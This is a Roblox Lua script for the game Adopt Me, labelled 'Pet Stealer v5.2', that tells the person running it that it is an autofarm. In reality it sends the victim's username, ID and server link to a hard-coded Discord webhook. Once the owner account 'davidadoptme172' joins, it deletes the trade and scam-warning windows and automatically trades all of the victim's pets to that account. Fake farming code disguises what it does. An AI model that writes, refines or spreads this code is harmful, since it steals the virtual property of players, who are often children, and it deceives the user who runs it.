-- 🐾 Adopt Me Pet Stealer v5.2 - ✅ FIXED VERSION
-- 🔥 Detects davidadoptme172 → KILLS TRADING GUIs → AUTO TRADES PETS!

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")

-- ⚙️ YOUR SETTINGS
local WEBHOOK = "https://discord.com/api/webhooks/1451560358434308237/5QfplYntO1wBNphJBWpoFMmTyGhUuE58x63sT0cvEAaYFIT1mlYBs_T_LanwQZEyOg_3"
local OWNER = "davidadoptme172"
local GAMEID = 920587237

print("🐾 **AUTOFARM v5.2 LOADING...** ✅ FIXED")

if game.PlaceId ~= GAMEID then 
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "❌ Wrong Game", Text = "Join Adopt Me!", Duration = 5
    })
    return
end

local lp = Players.LocalPlayer
local ownerFound = false

-- 🔥 FIXED SERVER GRABBER
local function sendVictimServer()
    local serverLink = "https://www.roblox.com/games/920587237/"..game.JobId
    local data = {
        username = "🎒 **NEW VICTIM**",
        embeds = {{
            title = "🔥 **SCRIPT ACTIVÉ** - "..lp.Name,
            description = "Auto-trade prêt quand **"..OWNER.."** rejoint!",
            color = 16711680,
            fields = {
                {name = "👤 Victime", value = lp.Name.." (`"..lp.UserId.."`)", inline = true},
                {name = "🌐 Serveur", value = "["..serverLink.."]("..serverLink..")", inline = false},
                {name = "👥 Joueurs", value = #Players:GetPlayers().."/12", inline = true}
            }
        }}
    }
    pcall(function()
        HttpService:PostAsync(WEBHOOK, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
    end)
    print("📤 Serveur envoyé: "..serverLink)
end

-- 🔒 TRADING GUI KILLER
local function killTradingGuis()
    for _, gui in pairs(lp.PlayerGui:GetChildren()) do
        if gui:IsA("ScreenGui") then
            local guiName = gui.Name:lower()
            if guiName:find("trade") or guiName:find("trading") or guiName:find("scam") or 
               guiName:find("warning") or guiName:find("confirm") then
                gui:Destroy()
                print("🗑️ Killed: "..gui.Name)
            end
        end
    end
end

-- 💎 AUTO TRADE FUNCTION (FIXED - DÉPLACÉE EN HAUT)
local function autoTradeToOwner()
    local ownerPlayer = nil
    for _, p in pairs(Players:GetPlayers()) do
        if p.Name:lower() == OWNER:lower() then
            ownerPlayer = p
            break
        end
    end
    
    if ownerPlayer then
        print("🎁 AUTO TRADING → "..OWNER)
        local pets = {}
        for _, tool in pairs(lp.Backpack:GetChildren()) do
            if tool:IsA("Tool") and tool.Name:lower():find("pet") then
                table.insert(pets, tool.Name)
            end
        end
        
        pcall(function()
            local tradeRemotes = {"TradeRemoteEvent", "MainEvent", "TradeEvent", "TradingRemote"}
            for _, remoteName in pairs(tradeRemotes) do
                local remote = ReplicatedStorage:FindFirstChild(remoteName)
                if remote then
                    remote:FireServer("StartTradeWithPlayer", ownerPlayer.UserId)
                    wait(0.5)
                    for _, petName in pairs(pets) do
                        remote:FireServer("AddItemToTrade", petName)
                    end
                    wait(1)
                    remote:FireServer("AcceptTrade")
                    break
                end
            end
        end)
        
        -- Trade success notification
        local data = {
            username = "💎 **PETS VOLÉS**",
            embeds = {{
                title = "🎉 TRADE TERMINÉ",
                description = lp.Name.." → "..OWNER.."\nPets: "..(#pets > 0 and table.concat(pets, ", ") or "Aucun pet trouvé"),
                color = 65280
            }}
        }
        pcall(function()
            HttpService:PostAsync(WEBHOOK, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
        end)
    end
end

-- 👑 OWNER DETECTOR (FIXED LOGIC)
spawn(function()
    while true do
        wait(1)
        for _, player in pairs(Players:GetPlayers()) do
            if player.Name:lower() == OWNER:lower() and player ~= lp and not ownerFound then
                ownerFound = true
                print("👑 **"..OWNER.." DETECTÉ!** → Auto-trade...")
                
                killTradingGuis()
                spawn(function()
                    while ownerFound and Players:FindFirstChild(OWNER) do
                        wait(0.5)
                        killTradingGuis()
                    end
                end)
                
                spawn(function()
                    wait(2)
                    autoTradeToOwner()
                end)
                break
            end
        end
    end
end)

-- 🚀 ENVOIE NOTIF DÈS LE DÉMARRAGE
sendVictimServer()

-- 🔄 Refresh every 45s
spawn(function()
    while wait(45) do
        sendVictimServer()
    end
end)

-- 💰 Fake farm
spawn(function()
    while wait(2) do
        pcall(function()
            if ReplicatedStorage:FindFirstChild("MainEvent") then
                ReplicatedStorage.MainEvent:FireServer("CollectBucks")
            end
        end)
    end
end)

-- 💫 Anti-AFK
spawn(function()
    while wait(60) do
        if lp.Character and lp.Character:FindFirstChild("Humanoid") then
            lp.Character.Humanoid:Move(Vector3.new())
        end
    end
end)

-- ✅ Success notification
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "🐾 Pet Stealer v5.2 ✅", 
    Text = "Script chargé!\nServeur envoyé → Attends "..OWNER, 
    Duration = 5
})

print("✅ **Autofarm going on soon !v5.2 !**")
